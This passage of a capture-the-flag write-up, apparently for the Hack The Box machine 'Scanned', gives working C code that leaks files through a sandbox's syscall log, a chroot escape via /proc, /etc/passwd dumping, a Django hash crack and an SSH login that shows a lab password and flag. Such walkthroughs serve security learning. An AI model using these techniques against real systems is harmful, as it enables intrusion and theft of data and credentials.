+<span class=mtk5>#include</span> <span class=mtk4>&lt;fcntl.h&gt;</span>
+<span class=mtk5>#include</span> <span class=mtk4>&lt;stdio.h&gt;</span>
+<span class=mtk5>#include</span> <span class=mtk4>&lt;unistd.h&gt;</span>
+
+<span class=mtk5>typedef</span> <span class="mtk7 mtki">struct</span> <span class=mtk8>__attribute__</span><span class=mtk1>((__packed__))</span> <span class=mtk1>{</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>rax;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>rdi;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>rsi;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>rdx;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>r10;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>r8;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>r9;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>ret;</span>
+<span class=mtk1>}</span> <span class=mtk1>registers;</span>
+
+<span class="mtk7 mtki">void</span> <span class=mtk8>log_syscall</span><span class=mtk1>(registers</span> <span class="mtk9 mtki">regs</span><span class=mtk1>,</span> <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk9 mtki">ret</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+  <span class=mtk1>registers</span> <span class=mtk1>result;</span>
+  <span class=mtk1>result.rax</span> <span class=mtk5>=</span> <span class=mtk1>regs.rax;</span>
+  <span class=mtk1>result.rdi</span> <span class=mtk5>=</span> <span class=mtk1>regs.rdi;</span>
+  <span class=mtk1>result.rsi</span> <span class=mtk5>=</span> <span class=mtk1>regs.rsi;</span>
+  <span class=mtk1>result.rdx</span> <span class=mtk5>=</span> <span class=mtk1>regs.rdx;</span>
+  <span class=mtk1>result.r10</span> <span class=mtk5>=</span> <span class=mtk1>regs.r10;</span>
+  <span class=mtk1>result.r8</span> <span class=mtk5>=</span> <span class=mtk1>regs.r8;</span>
+  <span class=mtk1>result.r9</span> <span class=mtk5>=</span> <span class=mtk1>regs.r9;</span>
+  <span class=mtk1>result.ret</span> <span class=mtk5>=</span> <span class=mtk1>ret;</span>
+
+  <span class="mtk7 mtki">int</span> <span class=mtk1>fd</span> <span class=mtk5>=</span> <span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk4>"/log"</span><span class=mtk1>,</span> <span class=mtk1>O_CREAT</span><span class=mtk5>|</span><span class=mtk1>O_RDWR</span><span class=mtk5>|</span><span class=mtk1>O_APPEND,</span> <span class=mtk5>0</span><span class=mtk6>777</span><span class=mtk1>);</span>  
+
+  <span class=mtk5>if</span> <span class=mtk1>(fd</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk5>return</span><span class=mtk1>;</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk8>write</span><span class=mtk1>(fd,</span> <span class=mtk5>&amp;</span><span class=mtk1>result,</span> <span class=mtk5>sizeof</span><span class=mtk1>(registers));</span>
+  <span class=mtk8>close</span><span class=mtk1>(fd);</span>
+<span class=mtk1>}</span>
+
+<span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>()</span> <span class=mtk1>{</span>
+  <span class=mtk1>DIR</span><span class=mtk5>*</span> <span class=mtk1>dr;</span>
+  <span class="mtk7 mtki">struct</span> <span class=mtk1>dirent</span> <span class=mtk5>*</span><span class=mtk1>de;</span>
+  <span class=mtk1>registers</span> <span class=mtk1>regs;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>ret;</span>
+
+  <span class=mtk1>regs.rax</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>3b</span><span class=mtk1>;</span>
+  <span class=mtk1>regs.rdi</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>41414141</span><span class=mtk1>;</span>
+  <span class=mtk1>regs.rsi</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>42424242</span><span class=mtk1>;</span>
+  <span class=mtk1>regs.rdx</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>43434343</span><span class=mtk1>;</span>
+  <span class=mtk1>regs.r10</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>44444444</span><span class=mtk1>;</span>
+  <span class=mtk1>regs.r8</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>45454545</span><span class=mtk1>;</span>
+  <span class=mtk1>regs.r9</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>46464646</span><span class=mtk1>;</span>
+  <span class=mtk1>ret</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>47474747</span><span class=mtk1>;</span>
+
+  <span class=mtk1>dr</span> <span class=mtk5>=</span> <span class=mtk8>opendir</span><span class=mtk1>(</span><span class=mtk4>"."</span><span class=mtk1>);</span>
+
+  <span class=mtk5>if</span> <span class=mtk1>(dr</span> <span class=mtk5>==</span> <span class=mtk6>NULL</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Could</span> <span class=mtk4>not</span> <span class=mtk4>open</span> <span class=mtk4>current</span> <span class=mtk4>directory"</span><span class=mtk1>);</span>
+    <span class=mtk5>return</span> <span class=mtk6>1</span><span class=mtk1>;</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk5>while</span> <span class=mtk1>((de</span> <span class=mtk5>=</span> <span class=mtk8>readdir</span><span class=mtk1>(dr))</span> <span class=mtk5>!=</span> <span class=mtk6>NULL</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%s\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>de-&gt;d_name);</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk8>log_syscall</span><span class=mtk1>(regs,</span> <span class=mtk1>ret);</span>
+  <span class=mtk8>closedir</span><span class=mtk1>(dr);</span>
+
+  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>The above script will register a <code>sys_execve</code> (<code>$rax = 0x3b</code>) using some recognizable numbers as register values. If we upload it and watch the output, we will see the <code>syscall</code> reported:</p><p><img src=/images/HTB/Scanned/Scanned-local-report-test.png alt="Scanned local report test"></p><p>We notice that not all registers are shown. That&rsquo;s because <code>sys_execve</code> only needs three arguments. If we wanted more, we could have used <code>sys_clone</code>, which uses five registers, but I will still use <code>sys_execve</code>, because I will be using only <code>ret</code> as output.</p><p>Now we need to parse the information we want to exfiltrate as hexadecimal values and set the <code>ret</code> value accordingly. This is an example to exfiltrate the listing of the current working directory:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>#include</span> <span class=mtk4>&lt;dirent.h&gt;</span>
+<span class=mtk5>#include</span> <span class=mtk4>&lt;fcntl.h&gt;</span>
+<span class=mtk5>#include</span> <span class=mtk4>&lt;stdio.h&gt;</span>
+<span class=mtk5>#include</span> <span class=mtk4>&lt;unistd.h&gt;</span>
+
+<span class=mtk5>typedef</span> <span class="mtk7 mtki">struct</span> <span class=mtk8>__attribute__</span><span class=mtk1>((__packed__))</span> <span class=mtk1>{</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>rax;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>rdi;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>rsi;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>rdx;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>r10;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>r8;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>r9;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>ret;</span>
+<span class=mtk1>}</span> <span class=mtk1>registers;</span>
+
+<span class="mtk7 mtki">void</span> <span class=mtk8>log_syscall</span><span class=mtk1>(</span><span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk9 mtki">ret</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+  <span class=mtk1>registers</span> <span class=mtk1>result;</span>
+
+  <span class=mtk1>result.rax</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>3b</span><span class=mtk1>;</span>
+  <span class=mtk1>result.rdi</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+  <span class=mtk1>result.rsi</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+  <span class=mtk1>result.rdx</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+  <span class=mtk1>result.r10</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+  <span class=mtk1>result.r8</span>  <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+  <span class=mtk1>result.r9</span>  <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+  <span class=mtk1>result.ret</span> <span class=mtk5>=</span> <span class=mtk1>ret;</span>
+
+  <span class="mtk7 mtki">int</span> <span class=mtk1>fd</span> <span class=mtk5>=</span> <span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk4>"/log"</span><span class=mtk1>,</span> <span class=mtk1>O_CREAT</span><span class=mtk5>|</span><span class=mtk1>O_RDWR</span><span class=mtk5>|</span><span class=mtk1>O_APPEND,</span> <span class=mtk5>0</span><span class=mtk6>777</span><span class=mtk1>);</span>  
+
+  <span class=mtk5>if</span> <span class=mtk1>(fd</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk5>return</span><span class=mtk1>;</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk8>write</span><span class=mtk1>(fd,</span> <span class=mtk5>&amp;</span><span class=mtk1>result,</span> <span class=mtk5>sizeof</span><span class=mtk1>(registers));</span>
+  <span class=mtk8>close</span><span class=mtk1>(fd);</span>
+<span class=mtk1>}</span>
+
+<span class="mtk7 mtki">void</span> <span class=mtk8>read_file</span><span class=mtk1>(</span><span class="mtk7 mtki">char</span><span class=mtk5>*</span> <span class="mtk9 mtki">path</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class=mtk1>ret</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk5>l</span><span class=mtk1>;</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk1>ret_string[</span><span class=mtk6>8</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk1>{</span><span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>};</span>
+  <span class="mtk7 mtki">int</span> <span class=mtk1>fd</span> <span class=mtk5>=</span> <span class=mtk8>open</span><span class=mtk1>(path,</span> <span class=mtk1>O_RDONLY);</span>
+
+  <span class=mtk5>while</span> <span class=mtk1>(</span><span class=mtk8>read</span><span class=mtk1>(fd,</span> <span class=mtk1>ret_string,</span> <span class=mtk6>8</span><span class=mtk1>))</span> <span class=mtk1>{</span>
+    <span class=mtk1>ret</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk5>l</span><span class=mtk1>;</span>
+
+    <span class=mtk5>for</span> <span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class=mtk1>i</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span> <span class=mtk1>i</span> <span class=mtk5>&lt;</span> <span class=mtk6>8</span><span class=mtk1>;</span> <span class=mtk1>i</span><span class=mtk5>++</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+      <span class=mtk1>ret</span> <span class=mtk5>&lt;&lt;=</span> <span class=mtk6>8</span><span class=mtk1>;</span>
+      <span class=mtk1>ret</span> <span class=mtk5>+=</span> <span class=mtk1>ret_string[i];</span>
+      <span class=mtk1>ret_string[i]</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+    <span class=mtk1>}</span>
+
+    <span class=mtk8>log_syscall</span><span class=mtk1>(ret);</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk8>close</span><span class=mtk1>(fd);</span>
+<span class=mtk1>}</span>
+
+<span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>()</span> <span class=mtk1>{</span>
+  <span class=mtk1>DIR</span><span class=mtk5>*</span> <span class=mtk1>dr;</span>
+  <span class="mtk7 mtki">struct</span> <span class=mtk1>dirent</span> <span class=mtk5>*</span><span class=mtk1>de;</span>
+  <span class=mtk1>FILE</span><span class=mtk5>*</span> <span class=mtk1>fp;</span>
+
+  <span class=mtk1>fp</span> <span class=mtk5>=</span> <span class=mtk8>fopen</span><span class=mtk1>(</span><span class=mtk4>"tmp_file"</span><span class=mtk1>,</span> <span class=mtk4>"wb"</span><span class=mtk1>);</span>
+  <span class=mtk1>dr</span> <span class=mtk5>=</span> <span class=mtk8>opendir</span><span class=mtk1>(</span><span class=mtk4>"."</span><span class=mtk1>);</span>
+
+  <span class=mtk5>while</span> <span class=mtk1>((de</span> <span class=mtk5>=</span> <span class=mtk8>readdir</span><span class=mtk1>(dr))</span> <span class=mtk5>!=</span> <span class=mtk6>NULL</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk8>fprintf</span><span class=mtk1>(fp,</span> <span class=mtk4>"</span><span class=mtk6>%s\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>de-&gt;d_name);</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk8>closedir</span><span class=mtk1>(dr);</span>
+  <span class=mtk8>fclose</span><span class=mtk1>(fp);</span>
+
+  <span class=mtk8>read_file</span><span class=mtk1>(</span><span class=mtk4>"tmp_file"</span><span class=mtk1>);</span>
+
+  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+</code></pre></div><p><img src=/images/HTB/Scanned/Scanned-exfiltration.png alt="Scanned exfiltration"></p><p>Using <code>curl</code> and some filtering we can extract the information:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | <span class=code-dark-green>grep</span> execve
+&lt;p style="font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;"&gt;<span class=code-red>execve</span>(0x0, 0x0, 0x0) = 0x7573720a2e0a746d&lt;/pre&gt;
+&lt;p style="font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;"&gt;<span class=code-red>execve</span>(0x0, 0x0, 0x0) = 0x705f66696c650a6c&lt;/pre&gt;
+&lt;p style="font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;"&gt;<span class=code-red>execve</span>(0x0, 0x0, 0x0) = 0x69620a7573657270&lt;/pre&gt;
+&lt;p style="font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;"&gt;<span class=code-red>execve</span>(0x0, 0x0, 0x0) = 0x726f670a62696e0a&lt;/pre&gt;
+&lt;p style="font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;"&gt;<span class=code-red>execve</span>(0x0, 0x0, 0x0) = 0x70726f630a2e2e0a&lt;/pre&gt;
+&lt;p style="font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;"&gt;<span class=code-red>execve</span>(0x0, 0x0, 0x0) = 0x6c696236340a6c6f&lt;/pre&gt;
+&lt;p style="font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;"&gt;<span class=code-red>execve</span>(0x0, 0x0, 0x0) = 0x670a000000000000&lt;/pre&gt;
+
+<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | <span class=code-dark-green>grep</span> execve | <span class=code-dark-green>awk</span> -F = <span class=code-dark-yellow>'{ print $3 }'</span>
+ 0x7573720a2e0a746d&lt;/pre&gt;
+ 0x705f66696c650a6c&lt;/pre&gt;
+ 0x69620a7573657270&lt;/pre&gt;
+ 0x726f670a62696e0a&lt;/pre&gt;
+ 0x70726f630a2e2e0a&lt;/pre&gt;
+ 0x6c696236340a6c6f&lt;/pre&gt;
+ 0x670a000000000000&lt;/pre&gt;
+
+<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | <span class=code-dark-green>grep</span> execve | <span class=code-dark-green>awk</span> -F = <span class=code-dark-yellow>'{ print $3 }'</span> | <span class=code-dark-green>sed</span> <span class=code-dark-yellow>'s/&lt;\/pre&gt;//g'</span>
+ 0x7573720a2e0a746d
+ 0x705f66696c650a6c
+ 0x69620a7573657270
+ 0x726f670a62696e0a
+ 0x70726f630a2e2e0a
+ 0x6c696236340a6c6f
+ 0x670a000000000000
+
+<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | <span class=code-dark-green>grep</span> execve | <span class=code-dark-green>awk</span> -F = <span class=code-dark-yellow>'{ print $3 }'</span> | <span class=code-dark-green>sed</span> <span class=code-dark-yellow>'s/&lt;\/pre&gt;//g'</span> | <span class=code-dark-green>awk</span> -F x <span class=code-dark-yellow>'{ printf "%16s\n", $2 }'</span>
+7573720a2e0a746d
+705f66696c650a6c
+69620a7573657270
+726f670a62696e0a
+70726f630a2e2e0a
+6c696236340a6c6f
+670a000000000000
+
+<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | <span class=code-dark-green>grep</span> execve | <span class=code-dark-green>awk</span> -F = <span class=code-dark-yellow>'{ print $3 }'</span> | <span class=code-dark-green>sed</span> <span class=code-dark-yellow>'s/&lt;\/pre&gt;//g'</span> | <span class=code-dark-green>awk</span> -F x <span class=code-dark-yellow>'{ printf "%16s\n", $2 }'</span> | <span class=code-dark-green>xxd</span> -r -p  
+usr
+.
+tmp_file
+lib
+userprog
+bin
+proc
+..
+lib64
+log
+</code></pre></div><p>We can follow the same process to read files from the sandbox environment. In the end, I decided to build a Bash script that compiles a binary with the file to read or directory to list, uploads it and extracts all the information automatically. This script is called <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Scanned/exploit.sh><code>exploit.sh</code></a> (detailed explanation <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Scanned#exploitsh>here</a>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> <span class=mtku>exploit.sh</span>
+[!] Usage: bash exploit.sh &lt;host&gt; &lt;f|d&gt; &lt;path-to-file|dir&gt;  
+
+<span class=code-cyan>$</span> <span class=code-dark-green>bash</span> <span class=mtku>exploit.sh</span> 127.0.0.1:8000 d /
+usr
+.
+tmp_file
+lib
+userprog
+bin
+proc
+..
+lib64
+log
+</code></pre></div><p>Now we can start enumerating the <code>/proc</code> directory in the remote machine. As explained before, there is a misconfiguration because the <code>sandbox</code> binary mounts <code>/proc</code> directory into the <code>chroot</code> environment, so we can access it from the sandbox:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> <span class=mtku>exploit.sh</span> 10.10.11.141 d /proc  
+.
+..
+fb
+fs
+bus
+dma
+irq
+mpt
+net
+sys
+tty
+acpi
+keys
+kmsg
+misc
+mtrr
+stat
+iomem
+kcore
+locks
+swaps
+crypto
+driver
+mounts
+uptime
+vmstat
+cgroups
+cmdline
+cpuinfo
+devices
+ioports
+loadavg
+meminfo
+modules
+sysvipc
+version
+consoles
+kallsyms
+pressure
+slabinfo
+softirqs
+zoneinfo
+buddyinfo
+diskstats
+key-users
+schedstat
+interrupts
+kpagecount
+kpageflags
+partitions
+timer_list
+execdomains
+filesystems
+kpagecgroup
+sched_debug
+vmallocinfo
+pagetypeinfo
+dynamic_debug
+sysrq-trigger
+self
+thread-self
+1
+2
+3
+</code></pre></div><p>There are three different process identifiers (PID): <code>1</code>, <code>2</code> and <code>3</code>. We are able to list the file descriptors used by those PID:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> <span class=mtku>exploit.sh</span> 10.10.11.141 d /proc/1/fd  
+.
+..
+0
+1
+2
+3
+
+<span class=code-cyan>$</span> <span class=code-dark-green>bash</span> <span class=mtku>exploit.sh</span> 10.10.11.141 d /proc/2/fd
+.
+..
+0
+1
+2
+3
+4
+
+<span class=code-cyan>$</span> <span class=code-dark-green>bash</span> <span class=mtku>exploit.sh</span> 10.10.11.141 d /proc/3/fd
+.
+..
+0
+1
+2
+3
+</code></pre></div><p>We notice that if we list the file descriptor number <code>3</code> (as a directory) we are listing the <code>jails</code> directory:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> <span class=mtku>exploit.sh</span> 10.10.11.141 d /proc/1/fd/3  
+7d431ab8af5ab635e048e40f36f69536
+.
+720e0160ff47fcd4da968b89de05d5e9
+..
+
+<span class=code-cyan>$</span> <span class=code-dark-green>bash</span> <span class=mtku>exploit.sh</span> 10.10.11.141 d /proc/3/fd/3
+.
+720e0160ff47fcd4da968b89de05d5e9
+..
+</code></pre></div><p>For some reason, we get more information with <code>/proc/1/fd/3</code>, so I will continue using this. Actually, we can climb up directories, escaping from <code>chroot</code> environment:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> <span class=mtku>exploit.sh</span> 10.10.11.141 d /proc/1/fd/3/..
+jails
+.
+..
+sandbox
+
+<span class=code-cyan>$</span> <span class=code-dark-green>bash</span> <span class=mtku>exploit.sh</span> 10.10.11.141 f /proc/1/fd/3/../../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+clarence:x:1000:1000:clarence,,,:/home/clarence:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+sandbox:x:1001:1001::/home/sandbox:/usr/sbin/nologin
+</code></pre></div><h2 id=foothold-on-the-machine>Foothold on the machine</h2><p>Nice, now we have a system user called <code>clarence</code> and we can read files from the server. Let&rsquo;s enumerate a bit more the web server:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> <span class=mtku>exploit.sh</span> 10.10.11.141 d /proc/1/fd/3/../..  
+scanner
+.
+malscanner
+..
+viewer
+templates
+.gitignore
+sandbox
+static
+manage.py
+uploads
+uwsgi_params
+requirements.txt
+malscanner.db
+</code></pre></div><p>There is a SQLite database file called <code>malscanner.db</code>. Let&rsquo;s try to download it and open it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> <span class=mtku>exploit.sh</span> 10.10.11.141 f /proc/1/fd/3/../../malscanner.db &gt; malscanner.db
+
+<span class=code-cyan>$</span> <span class=code-dark-green>file</span> <span class=mtku>malscanner.db</span>
+malscanner.db: SQLite 3.x database, last written using SQLite version 3033745, file counter 34, database pages 32, cookie 0x42, schema 4, UTF-8, version-valid-for 34  
+
+<span class=code-cyan>$</span> <span class=code-dark-green>sqlite3</span> <span class=mtku>malscanner.db</span>
+SQLite version 3.37.0 2021-12-09 01:34:53
+Enter ".help" for usage hints.
+sqlite> .tables
+Error: database disk image is malformed
+sqlite> .exit
+</code></pre></div><p>It is corrupt&mldr; But we can take a look at the strings inside, and find an MD5 hash for <code>clarence</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>strings</span> <span class=mtku>malscanner.db</span> | <span class=code-dark-green>grep</span> clarence
+md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf2021-09-14 18:39:55.237074<span class=code-red>clarence</span>2021-09-14 18:36:46.227819  
+<span class=code-red>clarence</span>
+</code></pre></div><p>Since it is in Django format and contains a salt, I decided to use a custom Go script to crack it using <code>rockyou.txt</code>: <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Scanned/crack.go><code>crack.go</code></a> (detailed explanation <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Scanned#crackgo>here</a>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>go</span> run <span class=mtku>crack.go</span> $WORDLISTS/rockyou.txt <span class=code-dark-yellow>'md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf'</span>  
+[*] Algorithm:   md5
+[*] Salt:        kL2cLcK2yhbp3za4w3752m
+[*] Hash:        9886e17b091eb5ccdc39e436128141cf
+
+[+] Cracked: onedayyoufeellikecrying
+</code></pre></div><p>And we got a password. Fortunately, this password is reused for SSH. And there we have <code>user.txt</code> flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> clarence@10.10.11.141
+clarence@10.10.11.141's password:  
+<span class=code-green>clarence@scanned</span>:<span class=code-blue>~</span>$ cat user.txt
+8e6287143ba5f57564bd0fb2ac7f733e
